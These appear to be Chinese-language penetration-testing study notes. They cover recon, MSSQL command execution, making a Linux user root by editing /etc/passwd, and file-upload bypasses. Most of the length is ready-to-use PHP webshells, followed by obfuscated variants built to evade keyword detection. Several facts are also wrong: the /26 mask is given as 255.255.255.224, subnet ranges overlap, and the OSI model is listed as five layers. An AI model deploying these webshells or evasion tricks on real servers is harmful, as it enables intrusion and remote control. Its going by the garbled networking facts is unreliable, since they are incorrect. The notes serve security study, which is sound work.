1.常见的编辑器漏洞
代码注入,远程命令执行,反序列化,文件包含,框架漏洞

2.常见的高危端口
80,445,8080,7001,3306,1443,22,21,1479

3.mssql如何执行系统命令
本地存储过程 sp_oamethod,sp_oacreate
系统存储过程 clr +xp_
扩展存储过程 xp_cmdshell 

4.伪协议有哪些
ftp://
zip://
rar://
zlib://
http://
data://

5.渗透测试信息收集的流程
icp备案号
备案号反查域名
whois
网络空间测绘
cms指纹识别
cdn判断
子域名收集
ip反查域名

6.linux创建高权限的用户
方法一:将用户加入wheel组
usermod -g wheel tomato
方法二:修改sudoers文件
vim /etc/sudoers
#添加下面这行
tomato	ALL=(ALL) 	ALL
方法三:修改passwd文件
vim /etc/passwd
#将x后面的第一个数字(uid)修改为0
tomato:x:0:1001::/home/tomato:/bin/bash

7.OSI模型
分别是:应用层,传输层,网络层,数据链路层,物理层
应用层:发送请求,传递给传输层
传输层:将请求包装成tcp段,传递给网络层
网络层:将tcp段封装成ip包,传递给数据链路层
数据链路层:将ip封装成帧,传递给物理层
物理层:将数据帧转化成电信号传输到目的

8.数据库的增删查改
#创建数据库
create database if not exists tomato;
#删除数据库
drop database tomato;
#创建表
create table users(
id int auto_increment primary key,
name varchar(50) not null);
#插入数据
insert into users(id,name) value(1,'tomato');
#查询数据
select * from users where id=1;
#删除数据
delete from users where id=1;

9.子网掩码划分(以192.168.71.0/24)
子网掩码:11111111,11111111,11111111,00000000
划分为4个班使用(2^2=4)
00,01,10,11
新的子网掩码(192.168.71.0/26)
子网掩码:11111111,11111111,11111111,11000000
2^7+2^6=128+64=192
255.255.255.224
每个子网的范围(2^6=64)个id地址
子网1:192.168.71.0~192.168.71.63
子网2:192.168.71.64~192.168.71.127
子网3:192.168.71.127~192.168.71.191
子网4:192.168.71.192~192.168.71.255

10.文件上传绕过
1.前端验证:禁用js,修改js,修改文件后缀
2.mine验证:修改content-type
filename='1.php' content-type='image/jpeg'
3.黑名单验证:特殊后缀(php3,php5),大小写绕过,空格绕过,点号绕过,:.jpg绕过,::$DATA绕过
4.00截断
5.文件解析绕过:.htaccess解析绕过,将目录下的所有文件解析为php文件
6.修改文件幻数头

11.文件上传防御
(1)采用白名单策略
(2)进行二次渲染,过滤图片马中的恶意代码
(3)文件重命名
(4)避免文件包含漏洞
(5)严格处理文件路径

12.webshell
命令执行函数:system,exec,shell_exec,passthru,popen,反引号
代码执行函数:eval,assert,preg_replace,create_function,array_map,assort,call_user_func,call_user_func_array,
array_filter
(1)<?php @preg_replace("/abc/e",$_REQUEST['c'],"abc");?>
(2)<?php $func=create_function("",$_REQUEST['d']); $func();?>
(3)<?php array_map('assert', [$_REQUEST['cmd']]); ?>
(4)<?php @call_user_func($_REQUEST['f'], $_REQUEST['cmd']); ?> #?f=system$cmd=whoami
(5)f=system&who=whoami
<?php
$who = $_REQUEST['who'];        // 从请求中获取 'who' 参数
$array1 = array($who);          // 将 'who' 参数值放入数组 $array1
$func2 = $_REQUEST['f'];        // 从请求中获取 'f' 参数，表示函数名
@array_filter($array1, $func2); // 使用用户传入的函数 $func2 对数组 $array1 进行处理
?>

13.webshell变形
绕过的方式:关键字查找,关键字替换,编码替换,操作符,更换数据来源,嵌套,更换标签(script),字符串组合,自定义类,自定义函数,魔术方法,匿名方法,异或运算
关键字查找:
<?php $a=str_replace("abc","","aabcsabcsabcsabceabcrabct");
@$($_REQUEST['cmd']);
?>

关键字替换:
<?php $b="assexx";
$c=str_replace("xx","rt",$b);
@[""=>$c($_GET[_]);?>

编码替换:		
<?php
$a=base64_decode("YXNzZXJ0");
$a($_REQUEST['cmd']);?>

操作符:
<?php
$a="as"."se";
$b="r"."t";
$c=$a.$b;
$c($_REQUEST['cmd']);?>

更换数据来源:
<?php
$_REQUEST[a]($_REQUEST['cmd']);
?>

嵌套:
<?php
@assert($_REQUEST[$_REQUEST['b']]);
?>

替换标签:
<script language="php">
@assert($_REQUEST['cmd']);
</script>

字符串组合:
<?php
$str='abcsqebrt';
$a=$str[0].$str[3].$str[5].$str[7].$str[8];
@$a($_REQUEST['cmd']);?>

自定义函数:
<?php 
function admin($a){
@eval($a);
}
admin($_REQUEST['admin']);?>

自定义类:
<?php
class webshell{
function admin($a){
@eval($a);
}}
$web=new webshell();
$web->admin($_REQUEST['admin']);
?>

魔术方法:
__construct,__destruct,_wakeup,__tostring

<?php
class student{
public $xw=null;
public $xl=null;
function _construct(){
$this->xw="riny(\$_REQUEST['anzr'])";
@assert($this->xl);
}}
new student();

匿名方法:
<?php
$fun1=create_funcation('$a,$b','return($a+$b);');
echo $func1(10,20);
?>






















































































